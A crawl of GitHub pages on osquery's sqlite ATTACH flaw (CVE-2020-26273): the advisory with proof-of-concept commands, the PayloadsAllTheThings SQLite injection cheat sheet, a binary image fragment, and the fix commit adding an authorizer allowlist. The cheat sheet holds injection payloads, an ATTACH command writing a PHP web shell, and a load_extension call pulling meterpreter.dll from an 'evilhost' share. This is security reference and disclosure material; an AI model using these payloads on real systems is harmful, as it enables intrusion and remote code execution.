=== Content from github.com_41001803_20250119_141358.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fsecurity%2Fadvisories%2FGHSA-4g56-2482-x7q8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fsecurity%2Fadvisories%2FGHSA-4g56-2482-x7q8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=osquery%2Fosquery)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[osquery](/osquery)
/
**[osquery](/osquery/osquery)**
Public

* [Notifications](/login?return_to=%2Fosquery%2Fosquery) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fosquery%2Fosquery)
* [Star
   22.2k](/login?return_to=%2Fosquery%2Fosquery)

* [Code](/osquery/osquery)
* [Issues
  586](/osquery/osquery/issues)
* [Pull requests
  35](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects
  0](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

Additional navigation options

* [Code](/osquery/osquery)
* [Issues](/osquery/osquery/issues)
* [Pull requests](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

# sqlite ATTACH allows some filesystem access

Moderate

[directionless](/directionless)
published
GHSA-4g56-2482-x7q8
Dec 15, 2020

## Package

osquery

## Affected versions

< 4.6.0

## Patched versions

None

## Description

### Impact

By using sqlite's [`ATTACH`](https://sqlite.org/lang_attach.html) verb, someone with administrative access to osquery can cause reads and writes to arbitrary sqlite databases on disk. This *does* allow arbitrary files to be created, but they will be sqlite databases.

**It does not appear to allow existing non-sqlite files to be overwritten.**

Create new files:

```
$ ls  /tmp/out.db; echo "ATTACH DATABASE '/tmp/out.db' AS o; CREATE TABLE o.out (a text); INSERT INTO o.out (a) VALUES('hello world');" | osqueryd -S ; ls /tmp/out.db
ls: /tmp/out.db: No such file or directory
/tmp/out.db
```

Existing non-sqlite files:

```
$ echo "ATTACH DATABASE '/tmp/existing' AS o; CREATE TABLE o.out (a text); INSERT INTO o.out (a) VALUES('hello world');" | osqueryd -S
Error: near line 1: file is not a database
```
### Patches

This has been patched in osquery 4.6.0.

### Workarounds

* In some deployments, the people with access to these interfaces may be considered administrators.
* In some deployments, configuration is managed by a central tool. This tool can filter for the `ATTACH` keyword
* osquery can be run as non-root user. Because this also limits the desired access levels, this requires deployment specific testing and configuration.

### References

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---load_extension>

### Severity

Moderate

### CVE ID

CVE-2020-26273

### Weaknesses

No CWEs

### Credits

* [![@martin-langhoff](https://avatars.githubusercontent.com/u/5116932?s=40&v=4)](/martin-langhoff)
  [martin-langhoff](/martin-langhoff)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2eafedfd_20250119_124048.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Fblob%2Fmaster%2FSQL%2520Injection%2FSQLite%2520Injection.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Fblob%2Fmaster%2FSQL%2520Injection%2FSQLite%2520Injection.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=swisskyrepo%2FPayloadsAllTheThings)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[swisskyrepo](/swisskyrepo)
/
**[PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings)**
Public

* [Notifications](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings) You must be signed in to change notification settings
* [Fork
  14.9k](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings)
* [Star
   62.6k](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings)

* [Code](/swisskyrepo/PayloadsAllTheThings)
* [Pull requests
  5](/swisskyrepo/PayloadsAllTheThings/pulls)
* [Actions](/swisskyrepo/PayloadsAllTheThings/actions)
* [Projects
  0](/swisskyrepo/PayloadsAllTheThings/projects)
* [Security](/swisskyrepo/PayloadsAllTheThings/security)
* [Insights](/swisskyrepo/PayloadsAllTheThings/pulse)

Additional navigation options

* [Code](/swisskyrepo/PayloadsAllTheThings)
* [Pull requests](/swisskyrepo/PayloadsAllTheThings/pulls)
* [Actions](/swisskyrepo/PayloadsAllTheThings/actions)
* [Projects](/swisskyrepo/PayloadsAllTheThings/projects)
* [Security](/swisskyrepo/PayloadsAllTheThings/security)
* [Insights](/swisskyrepo/PayloadsAllTheThings/pulse)

## Files

 master
## Breadcrumbs

1. [PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings/tree/master)
2. /[SQL Injection](/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
/
# SQLite Injection.md

Copy path Blame  Blame
## Latest commit

## History

[History](/swisskyrepo/PayloadsAllTheThings/commits/master/SQL%20Injection/SQLite%20Injection.md)129 lines (85 loc) · 5.05 KB master
## Breadcrumbs

1. [PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings/tree/master)
2. /[SQL Injection](/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
/
# SQLite Injection.md

Top
## File metadata and controls

* Preview
* Code
* Blame

129 lines (85 loc) · 5.05 KB[Raw](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/refs/heads/master/SQL%20Injection/SQLite%20Injection.md)
# SQLite Injection

> SQLite Injection is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.

## Summary

* [SQLite Comments](#sqlite-comments)
* [SQLite Enumeration](#sqlite-enumeration)
* [SQLite String](#sqlite-string)
  + [SQLite String Methodology](#sqlite-string-methodology)
* [SQLite Blind](#sqlite-blind)
  + [SQLite Blind Methodology](#sqlite-blind-methodology)
  + [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
* [SQlite Error Based](#sqlite-error-based)
* [SQlite Time Based](#sqlite-time-based)
* [SQlite Remote Code Execution](#sqlite-remote-code-execution)
  + [Attach Database](#attach-database)
  + [Load\_extension](#load_extension)
* [SQLite File Manipulation](#SQLite-file-manipulation)
  + [SQLite Read File](#SQLite-read-file)
  + [SQLite Write File](#SQLite-write-file)
* [References](#references)

## SQLite Comments

| Description | Comment |
| --- | --- |
| Single-Line Comment | `--` |
| Multi-Line Comment | `/**/` |

## SQLite Enumeration

| Description | SQL Query |
| --- | --- |
| DBMS version | `select sqlite_version();` |

## SQLite String

### SQLite String Methodology

| Description | SQL Query |
| --- | --- |
| Extract Database Structure | `SELECT sql FROM sqlite_schema` |
| Extract Database Structure (sqlite\_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
| Extract Table Name | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
| Extract Table Name | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |

## SQLite Blind

### SQLite Blind Methodology

| Description | SQL Query |
| --- | --- |
| Count Number Of Tables | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
| Enumerating Table Name | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
| Extract Info | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |

### SQLite Blind With Substring Equivalent

| Function | Example |
| --- | --- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |
| `SUBSTR` | `SUBSTR('foobar', <START>, <LENGTH>)` |

## SQlite Error Based

```
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## SQlite Time Based

```
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## SQLite Remote Code Execution

### Attach Database

```
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

### Load\_extension

⚠️ This component is disabled by default.

```
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

## SQLite File Manipulation

### SQLite Read File

SQLite does not support file I/O operations by default.

### SQLite Write File

```
SELECT writefile('/path/to/file', column_name) FROM table_name
```

## References

* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avatars.githubusercontent.com_726617ab_20250119_141355.html ===
���� JFIF  ` `  �� ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
�� C 



�� C  

��  ( (" ��           
�� �   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        
�� �  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? ��w��+��G����v�B�y�l��cxc�ی�>����z]��Kf"�����;�(�#������Bx'��T��d���{��db $T��E ���v��"�W��I��\_x���Z��Z�y�]�\*.\
Rv(�\�3\�\*ƕ�tQ���;Ag�EvR��%�S��6�W���U�4ҐGh��щ�sI�q�~@ W��?���V�X��\�լ
(:u�@F\_p�� n ��PA�95��CZ�[V��O�kP�-r�dp-�s�,��\�e\*��$d���ǧ���)�������� ��k�x/�F�����j�K��Y7�|F�q$�nw(\���E|1���7��$'�u�Z��Q��-��d̉�������I;�x�� Z´�߳�k/�Х���孢�n�m�^�]m�߈��'�Ԯn.�R�YRG� �Y�Թ'�#�w�������w~F-���6qݸ���xo�d3���u�.�,��Ff��#�i ��\*�`{�:6?���/��P�� �2�\_��w��t�YVB�����f�L�՗&�S粌\_\*��M?�l�1�^I�!�@v6r�����A�x�z����i,l�Z(�k��2���`��� ��|K��<@����%e������5TQ�l�7)9&�T�x/�O���{�\*��`��D�H\���q�\_Ӛ�)7e��J������1��U�;�xm��K6�`O�Ex������4���\*�2{�h��P�n���j��;(�$}5��I���e�o�����w���Q��ra�$g���� |p�4�B6����Z��z��{�2Gy,[)%A�8�z�(���iA��|�
rJZ�m�j�2�x�ni��c��nA�;�s�|1�ZxKV�> F��� g��p��2�Q@ �0�?Ҋ+ƜRVG�NM���YN��EW9���

=== Content from github.com_8754fab2_20250119_124046.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fcommit%2Fc3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fcommit%2Fc3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=osquery%2Fosquery)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[osquery](/osquery)
/
**[osquery](/osquery/osquery)**
Public

* [Notifications](/login?return_to=%2Fosquery%2Fosquery) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fosquery%2Fosquery)
* [Star
   22.2k](/login?return_to=%2Fosquery%2Fosquery)

* [Code](/osquery/osquery)
* [Issues
  586](/osquery/osquery/issues)
* [Pull requests
  35](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects
  0](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

Additional navigation options

* [Code](/osquery/osquery)
* [Issues](/osquery/osquery/issues)
* [Pull requests](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

## Commit

[Permalink](/osquery/osquery/commit/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-4g56-2482-x7q8](https://github.com/osquery/osquery/security/advisories/GHSA-4g56-2482-x7q8 "GHSA-4g56-2482-x7q8")

[Browse files](/osquery/osquery/tree/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c)
Browse the repository at this point in the history

```
* Proposed fix for attach tables vulnerability

* Add authorizer to ATC tables and cleanups

- Add unit test for authorizer function
```

* Loading branch information

[![@zwass](https://avatars.githubusercontent.com/u/575602?s=40&v=4)](/zwass)

[zwass](/osquery/osquery/commits?author=zwass "View all commits by zwass")
authored
Dec 14, 2020

1 parent
[dcfbd89](/osquery/osquery/commit/dcfbd89885a33a5660a3e0c94f659ed2feec1ca1)

commit c3f9a3d

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**90 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* osquery/sql

  + osquery/sql/sqlite\_util.cpp
    [sqlite\_util.cpp](#diff-6dd653164245848440fe551392238f5bc679d72950d21984f3782aa73b148d55)
  + osquery/sql/sqlite\_util.h
    [sqlite\_util.h](#diff-1da890eb014e479fd227a8b434d9b7dbe458984ef8ee2e4b35c6823ec7042b94)
  + tests

    - osquery/sql/tests/sqlite\_util\_tests.cpp
      [sqlite\_util\_tests.cpp](#diff-de9395db6a05f49c71cebf0c9254b1599c174bc02c5eadd0b8b863416e4773f0)
  + osquery/sql/virtual\_sqlite\_table.cpp
    [virtual\_sqlite\_table.cpp](#diff-502cef6289975c268a4d1fa567bb2fe6bf82a9c776e6c2f888e20ec68d27eadc)

## There are no files selected for viewing

25 changes: 25 additions & 0 deletions

25
[osquery/sql/sqlite\_util.cpp](#diff-6dd653164245848440fe551392238f5bc679d72950d21984f3782aa73b148d55 "osquery/sql/sqlite_util.cpp")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/sqlite_util.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,6 +16,7 @@ |
|  |  |  |
|  |  | #include <osquery/core/core.h> |
|  |  | #include <osquery/core/flags.h> |
|  |  | #include <osquery/core/shutdown.h> |
|  |  | #include <osquery/logger/logger.h> |
|  |  | #include <osquery/registry/registry\_factory.h> |
|  |  | #include <osquery/sql/sql.h> |
| Expand Down  Expand Up | | @@ -270,6 +271,23 @@ SQLiteDBInstance::SQLiteDBInstance(sqlite3\*& db, Mutex& mtx) |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | // This function is called by SQLite when a statement is prepared and we use |
|  |  | // it to allowlist specific actions. |
|  |  | int sqliteAuthorizer(void\* userData, |
|  |  | int code, |
|  |  | const char\* arg3, |
|  |  | const char\* arg4, |
|  |  | const char\* arg5, |
|  |  | const char\* arg6) { |
|  |  | if (kAllowedSQLiteActionCodes.count(code) > 0) { |
|  |  | return SQLITE\_OK; |
|  |  | } |
|  |  | LOG(ERROR) << "Authorizer denied action " << code << " " |
|  |  | << (arg3 ? arg3 : "null") << " " << (arg4 ? arg4 : "null") << " " |
|  |  | << (arg5 ? arg5 : "null") << " " << (arg6 ? arg6 : "null"); |
|  |  | return SQLITE\_DENY; |
|  |  | } |
|  |  |  |
|  |  | static inline void openOptimized(sqlite3\*& db) { |
|  |  | sqlite3\_open(":memory:", &db); |
|  |  |  |
| Expand All | | @@ -290,6 +308,12 @@ static inline void openOptimized(sqlite3\*& db) { |
|  |  | registerFilesystemExtensions(db); |
|  |  | registerHashingExtensions(db); |
|  |  | registerEncodingExtensions(db); |
|  |  |  |
|  |  | auto rc = sqlite3\_set\_authorizer(db, &sqliteAuthorizer, nullptr); |
|  |  | if (rc != SQLITE\_OK) { |
|  |  | LOG(ERROR) << "Failed to set sqlite authorizer: " << sqlite3\_errmsg(db); |
|  |  | requestShutdown(rc); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | void SQLiteDBInstance::init() { |
| Expand Down  Expand Up | | @@ -458,6 +482,7 @@ SQLiteDBInstanceRef SQLiteDBManager::getConnection(bool primary) { |
|  |  | if (!instance->isPrimary()) { |
|  |  | attachVirtualTables(instance); |
|  |  | } |
|  |  |  |
|  |  | return instance; |
|  |  | } |
|  |  |  |
| Expand Down | |  |

41 changes: 41 additions & 0 deletions

41
[osquery/sql/sqlite\_util.h](#diff-1da890eb014e479fd227a8b434d9b7dbe458984ef8ee2e4b35c6823ec7042b94 "osquery/sql/sqlite_util.h")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/sqlite_util.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -29,6 +29,47 @@ |
|  |  |  |
|  |  | namespace osquery { |
|  |  |  |
|  |  | int sqliteAuthorizer(void\* userData, |
|  |  | int code, |
|  |  | const char\* arg3, |
|  |  | const char\* arg4, |
|  |  | const char\* arg5, |
|  |  | const char\* arg6); |
|  |  |  |
|  |  | // Allowlist of SQLite actions. Any action not in this set is denied. See |
|  |  | // possible values in https://sqlite.org/c3ref/c\_alter\_table.html. |
|  |  | // \*\* Never allow SQLITE\_ATTACH \*\* as it can be used to write arbitrary files. |
|  |  | const std::unordered\_set<int> kAllowedSQLiteActionCodes = { |
|  |  | // Enable basic functionality |
|  |  | SQLITE\_READ, |
|  |  | SQLITE\_SELECT, |
|  |  |  |
|  |  | // Some extensions implement writeable tables |
|  |  | SQLITE\_INSERT, |
|  |  | SQLITE\_UPDATE, |
|  |  | SQLITE\_DELETE, |
|  |  |  |
|  |  | // Allow virtual tables to be attached |
|  |  | SQLITE\_CREATE\_VTABLE, |
